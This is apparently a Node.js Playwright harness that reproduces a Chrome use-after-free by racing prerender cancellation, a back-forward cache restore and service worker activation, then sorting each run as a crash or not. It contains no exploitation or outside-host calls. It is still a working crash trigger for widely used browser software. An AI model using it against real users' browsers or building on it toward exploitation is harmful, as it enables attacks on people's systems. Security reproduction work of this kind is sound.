#!/usr/bin/env node
/**
 * Reproducer for CVE-2026-110922 (crbug.com/568719351).
 *
 * Browser-process use-after-free in NavigationRequest::BeginNavigation():
 * cancelling a matching prerender while restoring a BackForwardCache entry can
 * synchronously start a queued prerender, whose navigation start evicts the
 * BFCached page and destroys the in-flight NavigationRequest.
 *
 * This script only tries to reproduce the crash and classify the outcome. It
 * contains no exploitation logic. It mirrors the patch's regression test
 * (PrerenderBackForwardCacheBrowserTest.EvictBackForwardCacheDuringPrerenderActivationCheck)
 * but drives it from web content instead of C++ browser-test hooks.
 *
 * Usage:
 *   node harness/repro-110922.mjs --browser builds/155.0.8059.84/chrome-linux64/chrome
 *   node harness/repro-110922.mjs --browser <path> --attempts 20 --headed
 *   DEBUG=pw:browser node harness/repro-110922.mjs ... 2>repro.log   # browser logs
 *
 * Exit code: 42 if at least one attempt crashed the browser, 0 otherwise.
 */
import { chromium } from "playwright-core";
import { createServer } from "node:http";

// ---------------------------------------------------------------- arguments

function parseArgs(argv) {
  const out = { attempts: 6, headless: true, delays: [0, 25, 75], chromeLog: false, prerenderCount: 6 };
  for (let i = 2; i < argv.length; i++) {
    const a = argv[i];
    if (a === "--browser") out.browser = argv[++i];
    else if (a === "--attempts") out.attempts = Number(argv[++i]);
    else if (a === "--headed") out.headless = false;
    else if (a === "--chrome-log") out.chromeLog = true;
    else if (a === "--prerender-count") out.prerenderCount = Number(argv[++i]);
    else if (a === "--delays") out.delays = argv[++i].split(",").map(Number);
  }
  return out;
}

const opts = parseArgs(process.argv);
if (!opts.browser) {
  console.error("usage: repro-110922.mjs --browser <path> [--attempts n] [--headed] [--delays 0,25,75]");
  process.exit(2);
}

// ------------------------------------------------------------------- server
//
// Mirrors the test's URL layout, because the No-Vary-Search hint only matches
// when the URLs differ *solely* in the `prerender` parameter:
//
//   /empty.html                 initial page (goes to BFCache)
//   /empty.html?next            second page that orchestrates the sequence
//   /empty.html?prerender=1     prerender 1, held in flight (stall)
//   /empty.html?prerender2      prerender 2, queued behind prerender 1
//
// The routes must be the same path or FindPotentialHostToActivate() will not
// consider the running prerender a candidate for the back navigation.

const state = { stall: 0, queued: 0, swFetches: 0, swVersion: 1, sw2ActivatedAt: null, requests: [] };
const held = new Set();

const PAGE_HEAD = '<!doctype html><meta charset="utf-8">';
const A_PAGE = `${PAGE_HEAD}<title>initial</title><h1>initial</h1><script>
window.__PAGESHOW = null;
window.addEventListener('pageshow', (e) => {
  window.__PAGESHOW = { persisted: e.persisted, at: performance.now() };
});
(async () => {
  try {
    const reg = await navigator.serviceWorker.register('/sw.js?v=1', { scope: '/' });
    await navigator.serviceWorker.ready;
    if (!navigator.serviceWorker.controller) {
      await new Promise((r) =>
        navigator.serviceWorker.addEventListener('controllerchange', r, { once: true }));
    }
    window.__A_READY = true;
  } catch (err) {
    window.__A_ERR = String(err);
  }
})();
</script>`;

const B_PAGE = `${PAGE_HEAD}<title>next</title><h1>next</h1>`;

function swScript(version) {
  if (version === 1) {
    // First registration: activate immediately and take control so that the
    // initial page is a controlled client (required for the eviction path).
    return `self.addEventListener('install', () => self.skipWaiting());
self.addEventListener('activate', (e) => e.waitUntil(self.clients.claim()));
`;
  }
  // v2: do NOT skip waiting on install. Activation is triggered from the page
  // so it can be raced against the back navigation.
  return `self.addEventListener('install', () => {});
self.addEventListener('activate', (e) => e.waitUntil(Promise.all([
  self.clients.claim(),
  fetch('/sw2-activated').catch(() => {}),
])));
self.addEventListener('message', (e) => {
  if (e.data && e.data.type === 'SKIP_WAITING') self.skipWaiting();
});
`;
}

function startServer() {
  const server = createServer((req, res) => {
    const url = new URL(req.url, "http://127.0.0.1");
    const send = (code, type, body, cache = "no-store") => {
      res.writeHead(code, { "Content-Type": type, "Cache-Control": cache });
      res.end(body);
    };

    if (url.pathname === "/status") {
      return send(200, "application/json", JSON.stringify(state));
    }
    if (url.pathname === "/reset") {
      state.stall = 0;
      state.queued = 0;
      state.swVersion = 1;
      state.sw2ActivatedAt = null;
      state.requests = [];
      return send(200, "application/json", JSON.stringify(state));
    }
    if (url.pathname === "/sw2-activated") {
      state.sw2ActivatedAt = Date.now();
      return send(200, "application/json", JSON.stringify(state));
    }
    if (url.pathname === "/bump") {
      state.swVersion = 2;
      return send(200, "application/json", JSON.stringify(state));
    }
    if (url.pathname === "/sw.js") {
      state.swFetches++;
      return send(200, "text/javascript", swScript(state.swVersion));
    }
    if (url.pathname === "/empty.html") {
      // Record how Chrome labels the request: prerender requests carry a
      // Sec-Purpose/Purpose hint, which tells us whether a rule actually
      // started a prerender or just warmed up a connection.
      state.requests.push({
        at: Date.now(),
        search: url.search,
        purpose: req.headers["sec-purpose"] ?? req.headers["purpose"] ?? "",
      });
      // prerender 1: accept the request and never answer, so it stays the
      // running prerender instead of completing.
      if (url.searchParams.has("prerender")) {
        state.stall++;
        held.add(res);
        res.on("close", () => held.delete(res));
        return; // intentionally no response
      }
      if ([...url.searchParams.keys()].some((k) => /^prerender\d+$/.test(k))) {
        state.queued++;
        return send(200, "text/html; charset=utf-8", B_PAGE, "no-cache");
      }
      if (url.searchParams.has("next")) {
        return send(200, "text/html; charset=utf-8", B_PAGE, "no-cache");
      }
      return send(200, "text/html; charset=utf-8", A_PAGE, "no-cache");
    }
    return send(404, "text/plain", "not found");
  });

  return new Promise((resolve) => {
    server.listen(0, "127.0.0.1", () => {
      const base = `http://127.0.0.1:${server.address().port}`;
      resolve({ server, base });
    });
  });
}

// ------------------------------------------------------------------ helpers

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function getStatus(base) {
  const r = await fetch(`${base}/status`);
  return r.json();
}

async function waitFor(base, predicate, timeoutMs) {
  const end = Date.now() + timeoutMs;
  while (Date.now() < end) {
    const s = await getStatus(base);
    if (predicate(s)) return s;
    await sleep(50);
  }
  return null;
}

const SPECULATION_RULES = {
  prerender1: {
    prerender: [{
      source: "list",
      urls: [],
      // `params=("prerender")` makes /empty.html?prerender=1 equivalent to
      // /empty.html, which is what makes it a candidate during the back nav.
      expects_no_vary_search: 'params=("prerender")',
    }],
  },
};

async function injectRule(page, rule) {
  await page.evaluate((json) => {
    const s = document.createElement("script");
    s.type = "speculationrules";
    s.textContent = json;
    document.head.appendChild(s);
  }, JSON.stringify(rule));
}

// ---------------------------------------------------------------- one attempt

async function attempt({ base, browserPath, headless, order, delayMs, label, prerenderCount }) {
  const out = {
    label,
    order,
    delayMs,
    milestones: { aReady: false, stall: false, queued: false, swWaiting: false, triggered: false },
    outcome: "unknown",
    error: null,
  };

  await fetch(`${base}/reset`);
  const browser = await chromium.launch({
    executablePath: browserPath,
    headless,
    // Playwright disables BFCache by default; the whole sequence depends on it.
    ignoreDefaultArgs: ["--disable-back-forward-cache"],
    args: [
      "--no-first-run",
      "--no-default-browser-check",
      "--disable-background-networking",
      "--disable-sync",
      "--metrics-recording-only",
      "--disable-features=Translate,MediaRouter",
      ...(opts.chromeLog
        ? ["--enable-logging=stderr", "--v=0", "--vmodule=prerender*=2,*navigation_request*=1"]
        : []),
    ],
  });

  let disconnected = false;
  browser.on("disconnected", () => (disconnected = true));

  const context = await browser.newContext();
  const page = await context.newPage();
  let rendererCrash = false;
  page.on("crash", () => (rendererCrash = true));

  try {
    // 1. initial page, controlled by service worker v1
    await page.goto(`${base}/empty.html`, { waitUntil: "load", timeout: 15000 });
    out.milestones.aReady = await page
      .waitForFunction(() => window.__A_READY === true || window.__A_ERR, { timeout: 10000 })
      .then(() => page.evaluate(() => window.__A_READY === true))
      .catch(() => false);
    if (!out.milestones.aReady) {
      out.outcome = "no-service-worker-control";
      return out;
    }

    // 2. navigate away so the initial page is a BFCache candidate
    await page.goto(`${base}/empty.html?next`, { waitUntil: "load", timeout: 15000 });

    // 3. prerender 1, with the No-Vary-Search hint, held in flight
    await injectRule(page, {
      ...SPECULATION_RULES.prerender1,
      prerender: [{ ...SPECULATION_RULES.prerender1.prerender[0], urls: [`${base}/empty.html?prerender=1`] }],
    });
    out.milestones.stall = Boolean(await waitFor(base, (s) => s.stall > 0, 5000));
    if (!out.milestones.stall) {
      out.outcome = "prerender1-not-requested";
      return out;
    }

    // 4. queue more prerenders behind it. Chromium may allow more than one
    // running prerender, so inject enough rules that the surplus has to sit in
    // pending_prerenders_.
    const queuedUrls = [];
    for (let k = 2; k <= prerenderCount; k++) queuedUrls.push(`${base}/empty.html?prerender${k}`);
    await injectRule(page, { prerender: [{ source: "list", urls: queuedUrls }] });
    await sleep(500);
    out.milestones.queued = Boolean(
      await waitFor(base, (s) => s.requests.some((r) => r.search !== "?prerender=1"), 3000),
    );

    // 5. install service worker v2, then race its activation against history.back()
    if (order !== "control") await fetch(`${base}/bump`);

    const triggered = await page.evaluate(async ({ order, delayMs }) => {
      if (order === "control") {
        history.back();
        return { waiting: false, control: true };
      }
      const reg = await navigator.serviceWorker.getRegistration();
      if (!reg) return { error: "no registration" };
      await reg.update().catch(() => {});

      const waiting = await new Promise((resolve) => {
        if (reg.waiting) return resolve(reg.waiting);
        const timer = setTimeout(() => resolve(null), 3000);
        reg.addEventListener("updatefound", () => {
          const worker = reg.installing;
          if (!worker) return;
          worker.addEventListener("statechange", () => {
            if (worker.state === "installed") {
              clearTimeout(timer);
              resolve(worker);
            }
          });
        });
      });

      if (order === "sw-then-back") {
        if (waiting) waiting.postMessage({ type: "SKIP_WAITING" });
        await new Promise((r) => setTimeout(r, delayMs));
        history.back();
      } else {
        history.back();
        if (waiting) waiting.postMessage({ type: "SKIP_WAITING" });
      }
      return { waiting: Boolean(waiting) };
    }, { order, delayMs }).catch((e) => ({ error: String(e) }));

    out.milestones.swWaiting = Boolean(triggered?.waiting);
    out.milestones.triggered = !triggered?.error;
    const backAt = Date.now();

    // 6. observe: did we come back from BFCache, load normally, or die?
    const end = Date.now() + 8000;
    let pageshow = null;
    while (Date.now() < end) {
      if (disconnected || rendererCrash) break;
      try {
        pageshow = await page.evaluate(() => window.__PAGESHOW ?? null);
        if (pageshow) break;
      } catch (e) {
        if (/crash|Target closed|Protocol error|disconnected/i.test(String(e))) break;
      }
      await sleep(100);
    }

    if (disconnected || rendererCrash) {
      out.outcome = "crash";
    } else if (pageshow?.persisted === true) {
      // BFCache restore completed: the eviction did not land inside the
      // prerender activation check window.
      out.outcome = "bfcache-restore";
    } else if (pageshow) {
      // Eviction landed, but we cannot tell from content whether it hit the
      // exact window; the navigation was restarted as a normal load.
      out.outcome = "evicted-normal-load";
    } else {
      out.outcome = "no-outcome";
    }

    // Positive: service worker v2 activated after history.back() was called.
    const finalStatus = await getStatus(base).catch(() => null);
    out.sw2DeltaMs =
      finalStatus?.sw2ActivatedAt != null ? finalStatus.sw2ActivatedAt - backAt : null;
    out.sw2Activated = finalStatus?.sw2ActivatedAt != null;
    out.backAt = backAt;
    out.requests = (finalStatus?.requests ?? []).map((r) => ({
      deltaMs: r.at - backAt,
      search: r.search,
      purpose: r.purpose,
    }));
    // A pending prerender that starts *because* prerender 1 was cancelled will
    // hit the server right around history.back().
    out.startedAtBack = out.requests.some(
      (r) => r.search !== "?prerender=1" && r.deltaMs > -100 && r.deltaMs < 500,
    );
  } catch (err) {
    if (/crash|Target closed|Protocol error|disconnected/i.test(String(err))) {
      out.outcome = "crash";
    } else {
      out.outcome = "error";
      out.error = String(err).slice(0, 200);
    }
  } finally {
    await browser.close().catch(() => {});
  }

  return out;
}

// --------------------------------------------------------------------- main

const { server, base } = await startServer();
console.log(`[i] server ${base}`);
console.log(`[i] browser ${opts.browser}`);

const orderVariants = ["sw-then-back", "back-then-sw"];
const results = [];

try {
  // Control: plain back navigation with no service worker update. If this does
  // not report persisted=true, BFCache is not in play and every other result
  // is uninterpretable.
  const control = await attempt({
    base, browserPath: opts.browser, headless: opts.headless,
    order: "control", delayMs: 0, label: "control", prerenderCount: opts.prerenderCount,
  });
  results.push(control);
  console.log(`[control] outcome=${control.outcome} sw2=${control.sw2Activated ? "yes" : "no"} milestones=${JSON.stringify(control.milestones)}`);

  let done = control.outcome === "crash";
  for (let i = 0; i < opts.attempts && !done; i++) {
    for (const order of orderVariants) {
      for (const delayMs of opts.delays) {
        const label = `${order}/d${delayMs}/#${i}`;
        const r = await attempt({
          base, browserPath: opts.browser, headless: opts.headless,
          order, delayMs, label, prerenderCount: opts.prerenderCount,
        });
        results.push(r);
        console.log(`[${label}] outcome=${r.outcome} sw2=${r.sw2Activated ? `${r.sw2DeltaMs}ms` : "no"} startedAtBack=${r.startedAtBack} ${JSON.stringify(r.milestones)}${r.error ? " " + r.error : ""}`);
        for (const q of r.requests ?? []) {
          console.log(`    req ${q.deltaMs >= 0 ? "+" : ""}${q.deltaMs}ms ${q.search} purpose=${q.purpose || "-"}`);
        }
        if (r.outcome === "crash") { done = true; break; }
      }
      if (done) break;
    }
  }
} finally {
  for (const res of held) res.destroy();
  server.close();
}

const summary = results.reduce((acc, r) => {
  acc[r.outcome] = (acc[r.outcome] ?? 0) + 1;
  return acc;
}, {});
console.log("\n===== SUMMARY =====");
console.log(JSON.stringify(summary, null, 2));
console.log(`attempts=${results.length} crashed=${results.filter((r) => r.outcome === "crash").length}`);
process.exit(results.some((r) => r.outcome === "crash") ? 42 : 0);
